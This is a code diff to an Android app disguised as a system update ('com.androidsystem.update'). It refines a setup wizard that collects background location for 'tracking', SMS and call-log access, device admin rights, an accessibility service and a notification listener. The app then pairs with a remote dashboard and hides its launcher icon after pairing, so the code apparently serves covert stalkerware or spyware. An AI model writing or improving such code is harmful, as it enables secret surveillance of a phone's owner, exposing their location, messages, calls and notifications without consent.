@@ -9,8 +9,8 @@ import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.PowerManager
 import android.provider.Settings
-import android.util.Log
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.activity.compose.rememberLauncherForActivityResult
@@ -28,8 +28,15 @@ import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.text.style.TextAlign
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+import androidx.core.content.ContextCompat
+import com.androidsystem.update.accessibility.AccessibilityServiceImpl
 import com.androidsystem.update.receiver.DeviceAdminReceiver
 import com.androidsystem.update.service.CoreService
+import com.androidsystem.update.service.NotificationListener
+import kotlinx.coroutines.delay
+
+private const val PREFS_NAME = "app_prefs"
+private const val SETUP_COMPLETED_KEY = "setup_completed"
 
 class SetupWizard : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -41,6 +48,16 @@ class SetupWizard : ComponentActivity() {
 @Composable
 private fun SetupWizardContent() {
     val context = LocalContext.current
+    val prefs = remember { context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE) }
+
+    // Reopen after setup: go straight to the completion screen (pairing code /
+    // paired status) instead of re-running the whole permission wizard.
+    val setupCompleted = remember { prefs.getBoolean(SETUP_COMPLETED_KEY, false) }
+    if (setupCompleted) {
+        CompletionScreen(context)
+        return
+    }
+
     var step by remember { mutableStateOf(0) }
     var allCompleted by remember { mutableStateOf(false) }
     var stepError by remember { mutableStateOf<String?>(null) }
@@ -64,11 +81,31 @@ private fun SetupWizardContent() {
         "Všetko je nastavené. Spustenie služby."
     )
 
+    // Location is requested in two steps: foreground first, then background
+    // separately. On Android 11+ asking for ACCESS_BACKGROUND_LOCATION in the
+    // same dialog as foreground location is silently ignored by the system.
+    val locationBackgroundLauncher = rememberLauncherForActivityResult(
+        ActivityResultContracts.RequestMultiplePermissions()
+    ) { granted ->
+        if (granted[Manifest.permission.ACCESS_BACKGROUND_LOCATION] == true) {
+            stepError = null; step++
+        } else {
+            stepError = "Povolenie polohy na pozadí je potrebné pre sledovanie"
+        }
+    }
+
     val locationLauncher = rememberLauncherForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
     ) { granted ->
         if (granted[Manifest.permission.ACCESS_FINE_LOCATION] == true) {
-            stepError = null; step++
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
+                ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+                != PackageManager.PERMISSION_GRANTED
+            ) {
+                locationBackgroundLauncher.launch(arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION))
+            } else {
+                stepError = null; step++
+            }
         } else {
             stepError = "Povolenie polohy je potrebné"
         }
@@ -81,7 +118,7 @@ private fun SetupWizardContent() {
             granted[Manifest.permission.READ_CALL_LOG] == true) {
             stepError = null; step++
         } else {
-            stepError = "Aspoň jedno povolenie je potrebné"
+            stepError = "Povolenia SMS a hovorov sú potrebné"
         }
     }
 
@@ -118,7 +155,6 @@ private fun SetupWizardContent() {
         step++
     }
 
-    // FIX: Proper device admin check
     val adminLauncher = rememberLauncherForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) {
@@ -131,17 +167,51 @@ private fun SetupWizardContent() {
         }
     }
 
+    // Accessibility is verified against the real system state, so a step is
+    // never marked done when the user actually backed out of the settings.
     val accessibilityLauncher = rememberLauncherForActivityResult(
         ActivityResultContracts.StartActivityForResult()
-    ) { stepError = null; step++ }
+    ) {
+        if (isAccessibilityEnabled(context)) {
+            stepError = null; step++
+        } else {
+            stepError = "Služba prístupnosti nie je zapnutá"
+        }
+    }
 
     val notificationListenerLauncher = rememberLauncherForActivityResult(
         ActivityResultContracts.StartActivityForResult()
-    ) { stepError = null; step++ }
+    ) {
+        if (isNotificationListenerEnabled(context)) {
+            stepError = null; step++
+        } else {
+            stepError = "Prístup k notifikáciám nie je povolený"
+        }
+    }
+
+    // Android 13+ requires the runtime POST_NOTIFICATIONS permission before the
+    // app can show the foreground-service notification at all.
+    val notificationPermLauncher = rememberLauncherForActivityResult(
+        ActivityResultContracts.RequestMultiplePermissions()
+    ) { granted ->
+        val permOk = Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU ||
+            granted[Manifest.permission.POST_NOTIFICATIONS] == true
+        if (permOk) {
+            notificationListenerLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
+        } else {
+            stepError = "Povolenie notifikácií je potrebné"
+        }
+    }
 
     val batteryLauncher = rememberLauncherForActivityResult(
         ActivityResultContracts.StartActivityForResult()
-    ) { stepError = null; step++ }
+    ) {
+        if (isBatteryOptimizationIgnored(context)) {
+            stepError = null; step++
+        } else {
+            stepError = "Optimalizácia batérie nie je vypnutá"
+        }
+    }
 
     val autoStartLauncher = rememberLauncherForActivityResult(
         ActivityResultContracts.StartActivityForResult()
@@ -151,8 +221,7 @@ private fun SetupWizardContent() {
         {
             locationLauncher.launch(arrayOf(
                 Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION,
-                Manifest.permission.ACCESS_BACKGROUND_LOCATION
+                Manifest.permission.ACCESS_COARSE_LOCATION
             ))
         },
         {
@@ -174,7 +243,16 @@ private fun SetupWizardContent() {
             )
         },
         { accessibilityLauncher.launch(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
-        { notificationListenerLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) },
+        {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
+                ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS)
+                != PackageManager.PERMISSION_GRANTED
+            ) {
+                notificationPermLauncher.launch(arrayOf(Manifest.permission.POST_NOTIFICATIONS))
+            } else {
+                notificationListenerLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
+            }
+        },
         {
             batteryLauncher.launch(
                 Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
@@ -212,7 +290,13 @@ private fun SetupWizardContent() {
                 context.startForegroundService(serviceIntent)
             else
                 context.startService(serviceIntent)
-            hideLauncherIcon(context)
+            // Mark setup as done so reopening the app shows the pairing code
+            // again instead of restarting the wizard.
+            prefs.edit().putBoolean(SETUP_COMPLETED_KEY, true).apply()
+            // Hide the icon only when the device is already paired. While
+            // unpaired the launcher icon must stay so the pairing code stays
+            // recoverable (CoreService hides the icon once pairing confirms).
+            if (prefs.getBoolean("is_paired", false)) CoreService.hideLauncherIcon(context)
             allCompleted = true
         }
     )
@@ -279,21 +363,25 @@ private fun SetupWizardContent() {
 
 @Composable
 private fun CompletionScreen(context: Context) {
-    // Pairing contract: CoreService generates the 6-digit code on its first
-    // heartbeat and stores it under app_prefs/pairing_code. If the service
-    // hasn't run yet, generate it here (same format + storage) so the user
-    // always sees a stable code on this screen.
-    val pairingState = remember {
-        val prefs = context.getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
-        val alreadyPaired = prefs.getBoolean("is_paired", false)
-        val code = prefs.getString("pairing_code", null)
+    // CoreService generates the 6-digit code on its first heartbeat and stores
+    // it under app_prefs/pairing_code. If the service hasn't run yet, generate
+    // it here (same format + storage) so the user always sees a stable code.
+    val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+    val pairingCode = remember {
+        prefs.getString("pairing_code", null)
             ?: (100000..999999).random().toString().also {
                 prefs.edit().putString("pairing_code", it).apply()
             }
-        alreadyPaired to code
     }
-    val isPaired = pairingState.first
-    val pairingCode = pairingState.second
+    var isPaired by remember { mutableStateOf(prefs.getBoolean("is_paired", false)) }
+
+    // Live-update the screen once the dashboard confirms the pairing.
+    LaunchedEffect(Unit) {
+        while (!isPaired) {
+            delay(3000)
+            isPaired = prefs.getBoolean("is_paired", false)
+        }
+    }
 
     Column(
         modifier = Modifier.fillMaxSize().verticalScroll(rememberScrollState()).padding(32.dp),
@@ -338,6 +426,8 @@ private fun CompletionScreen(context: Context) {
                     )
                     Spacer(Modifier.height(10.dp))
                     Text("Kód platí 5 minút a po spárovaní sa automaticky deaktivuje.", fontSize = 12.sp, textAlign = TextAlign.Center, color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.5f))
+                    Spacer(Modifier.height(6.dp))
+                    Text("Ak kód nestihnete prepísať, zatvorte aplikáciu a otvorte ju znova — kód sa zobrazí znovu.", fontSize = 12.sp, textAlign = TextAlign.Center, color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.5f))
                 }
             }
         }
@@ -352,14 +442,25 @@ private fun CompletionScreen(context: Context) {
     }
 }
 
-private fun hideLauncherIcon(context: Context) {
-    try {
-        context.packageManager.setComponentEnabledSetting(
-            ComponentName(context, SetupWizard::class.java),
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        )
-    } catch (e: Exception) {
-        Log.e("SetupWizard", "Failed to hide icon", e)
-    }
+private fun isAccessibilityEnabled(context: Context): Boolean {
+    val expected = "${context.packageName}/${AccessibilityServiceImpl::class.java.name}"
+    val enabled = Settings.Secure.getString(
+        context.contentResolver,
+        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+    ) ?: return false
+    return enabled.split(':').any { it.equals(expected, true) }
+}
+
+private fun isNotificationListenerEnabled(context: Context): Boolean {
+    val expected = "${context.packageName}/${NotificationListener::class.java.name}"
+    val enabled = Settings.Secure.getString(
+        context.contentResolver,
+        "enabled_notification_listeners"
+    ) ?: return false
+    return enabled.split(':').any { it.equals(expected, true) }
+}
+
+private fun isBatteryOptimizationIgnored(context: Context): Boolean {
+    val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
+    return pm.isIgnoringBatteryOptimizations(context.packageName)
 }
